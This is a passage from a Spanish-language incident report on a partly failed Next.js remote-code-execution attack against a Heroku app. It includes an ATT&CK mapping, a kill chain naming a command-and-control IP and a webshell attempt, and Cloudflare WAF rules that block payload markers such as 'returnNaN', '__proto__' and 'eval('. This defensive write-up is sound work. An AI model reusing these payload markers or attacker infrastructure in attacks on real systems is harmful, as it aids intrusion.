fwd="87.121.84.24"  # Solo una IP, sin IP de Cloudflare

# Request normal
fwd="149.88.17.139, 172.68.7.155"  # IP usuario + IP Cloudflare
```

## 10.2 Técnicas MITRE ATT&CK Utilizadas

| ID | Técnica | Uso en este ataque |
|----|---------|-------------------|
| T1190 | Exploit Public-Facing Application | Explotación de vulnerabilidad en Next.js |
| T1059.007 | JavaScript | Ejecución de código JavaScript malicioso |
| T1105 | Ingress Tool Transfer | Intento de descargar/crear webshell |
| T1071.001 | Application Layer Protocol: Web | Comunicación HTTP con servidor C2 |
| T1083 | File and Directory Discovery | Escaneo de múltiples rutas de archivos |
| T1595.002 | Vulnerability Scanning | Escaneo de /exec, /info.php, /wp-admin |
| T1090 | Proxy | Uso de múltiples VPS como proxies |

## 10.3 Cadena de Ataque (Kill Chain)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CYBER KILL CHAIN                                   │
└─────────────────────────────────────────────────────────────────────────────┘

1. RECONOCIMIENTO          2. ARMAMENTO               3. ENTREGA
   ├─ Escaneo de           ├─ Desarrollo de           ├─ POST requests
   │  vulnerabilidades     │  payload RCE             │  a Server Actions
   ├─ /info.php            ├─ Código para             ├─ Bypass de
   ├─ /wp-admin            │  webshell (lrt)          │  Cloudflare
   └─ /swagger-ui          └─ Script de C2            └─ HTTP sin TLS

         │                        │                         │
         ▼                        ▼                         ▼

4. EXPLOTACIÓN             5. INSTALACIÓN             6. COMANDO Y CONTROL
   ├─ RCE via              ├─ Intento de              ├─ Conexión a
   │  Flight Protocol      │  escribir /lrt           │  176.65.132.224
   ├─ returnNaN            ├─ /tmp, /var,             ├─ Puerto 80
   │  ejecutado            │  /dev/shm                │  (HTTP)
   └─ Código corrió        └─ BLOQUEADO               └─ TIMEOUT
      parcialmente            por Heroku                  (fallido)

         │                        │                         │
         ▼                        ▼                         ▼

      PARCIAL               ❌ FALLIDO                 ❌ FALLIDO
      (errores)


7. ACCIONES SOBRE OBJETIVOS
   ├─ Exfiltración de datos  → NO LOGRADO
   ├─ Persistencia           → NO LOGRADO
   ├─ Movimiento lateral     → NO APLICABLE
   └─ Impacto                → MÍNIMO (solo errores 500)
```

---

# 11. Recomendaciones

## 11.1 Acciones Inmediatas (Completadas ✅)

| Acción | Estado | Fecha |
|--------|--------|-------|
| Actualizar Next.js a versión parcheada | ✅ | 2026-01-22 |
| Bloquear IPs atacantes en middleware | ✅ | 2026-01-22 |
| Implementar detección de bypass de Cloudflare | ✅ | 2026-01-22 |
| Eliminar paquetes vulnerables no usados | ✅ | 2026-01-22 |
| Documentar el incidente | ✅ | 2026-01-22 |

## 11.2 Acciones a Corto Plazo (1-7 días)

| Acción | Prioridad | Responsable |
|--------|-----------|-------------|
| Activar "Always Use HTTPS" en Cloudflare | Alta | DevOps |
| Crear reglas WAF en Cloudflare | Alta | DevOps |
| Revisar logs de acceso a base de datos | Media | DBA |
| Rotar secrets y API keys por precaución | Media | DevOps |
| Notificar al equipo sobre el incidente | Media | Seguridad |

## 11.3 Acciones a Mediano Plazo (1-4 semanas)

| Acción | Prioridad | Responsable |
|--------|-----------|-------------|
| Implementar logging persistente en DB | Media | Backend |
| Configurar alertas automáticas de seguridad | Media | DevOps |
| Realizar penetration testing | Media | Seguridad |
| Revisar todas las Server Actions del código | Media | Backend |
| Implementar CSP (Content Security Policy) | Baja | Frontend |

## 11.4 Acciones a Largo Plazo (1-3 meses)

| Acción | Prioridad | Responsable |
|--------|-----------|-------------|
| Considerar Cloudflare Pro para WAF avanzado | Media | Management |
| Implementar SIEM para detección de amenazas | Baja | Seguridad |
| Crear runbook de respuesta a incidentes | Media | Seguridad |
| Capacitación del equipo en seguridad | Baja | RRHH |

## 11.5 Configuración Recomendada de Cloudflare

### Reglas WAF sugeridas:

```
Regla 1: Bloquear POSTs sospechosos
───────────────────────────────────
Expression:
(http.request.method eq "POST" and http.request.uri.path eq "/") or
(http.request.method eq "POST" and http.request.uri.path contains "/_next")
Action: Challenge (o Block si los ataques continúan)

Regla 2: Bloquear payloads conocidos
───────────────────────────────────
Expression:
(http.request.body contains "returnNaN") or
(http.request.body contains "__proto__") or
(http.request.body contains "eval(")
Action: Block

Regla 3: Bloquear escaneo de vulnerabilidades
───────────────────────────────────
Expression:
(http.request.uri.path contains ".php") or
(http.request.uri.path contains "/wp-admin") or
(http.request.uri.path contains "/swagger") or
(http.request.uri.path eq "/exec")
Action: Block

Regla 4: Bloquear IPs conocidas
───────────────────────────────────
Expression:
(ip.src eq 87.121.84.24) or
(ip.src eq 195.3.222.78) or
(ip.src eq 176.65.132.224) or
(ip.src eq 129.159.127.76) or
(ip.src eq 72.55.179.209)
Action: Block
```

---

# 12. Lecciones Aprendidas

## 12.1 Lo que funcionó bien

1. **Protecciones de Heroku**
   - El filesystem read-only previno la instalación de webshell
   - Los permisos restrictivos bloquearon escritura en /tmp y /dev/shm

2. **Detección rápida**
   - Los logs de Heroku permitieron identificar el ataque
   - Los errores de JavaScript fueron buenos indicadores

3. **Respuesta eficiente**
   - Tiempo de mitigación: ~1 hora desde detección
   - No hubo interrupción del servicio

4. **Infraestructura separada**
   - Base de datos en MongoDB Atlas (separada de Heroku)
   - Credenciales no expuestas en código

## 12.2 Áreas de mejora

1. **Monitoreo proactivo**
   - No había alertas automáticas configuradas
   - El ataque se detectó por análisis manual de logs

2. **Gestión de vulnerabilidades**
   - Next.js 15.4.4 tenía vulnerabilidad conocida (publicada)
   - Se debió actualizar antes del ataque

3. **Validación de origen**
   - No se validaba si los requests venían de Cloudflare
   - Permitió bypass directo a Heroku

4. **Rate limiting**
   - El rate limiting existente no fue suficiente
   - 196+ requests maliciosos pasaron

## 12.3 Preguntas para reflexión

1. ¿Por qué no se actualizó Next.js cuando se publicó la vulnerabilidad?
2. ¿Cómo el atacante descubrió la URL directa de Heroku?
3. ¿Hay otros servicios expuestos que deberían estar detrás de Cloudflare?
4. ¿El equipo tiene un proceso para revisar vulnerabilidades periódicamente?

---

# 13. Anexos

## 13.1 Comandos útiles para investigación futura

```bash
# Ver logs de Heroku en tiempo real
heroku logs --tail --app centromundox-front

# Filtrar logs de seguridad
heroku logs --app centromundox-front -n 500 | grep -i "security"

# Buscar IPs específicas
heroku logs --app centromundox-front -n 1000 | grep "87.121.84.24"

# Contar errores por tipo
heroku logs --app centromundox-front -n 1000 | grep -c "returnNaN"

# Verificar vulnerabilidades de npm
npm audit

# Ver versión de Next.js
npm ls next
```

## 13.2 Referencias

- [GHSA-9qr9-h5gf-34mp - Next.js RCE](https://github.com/advisories/GHSA-9qr9-h5gf-34mp)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [Cloudflare WAF Documentation](https://developers.cloudflare.com/waf/)
- [Heroku Security](https://www.heroku.com/policy/security)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

## 13.3 Contactos

| Rol | Responsabilidad |
|-----|-----------------|
| Desarrollador | Implementación de parches |
| DevOps | Configuración de Cloudflare y Heroku |
| Seguridad | Análisis y documentación |

## 13.4 Historial de revisiones

| Versión | Fecha | Autor | Cambios |
|---------|-------|-------|---------|
| 1.0 | 2026-01-22 | Claude AI | Documento inicial |

---

# Fin del Informe

**Clasificación:** CONFIDENCIAL
**Distribución:** Equipo de desarrollo y seguridad
**Retención:** Conservar por mínimo 1 año

---

*Este informe fue generado con asistencia de Claude AI basándose en el análisis de logs de Heroku y la respuesta al incidente del 22 de enero de 2026.*
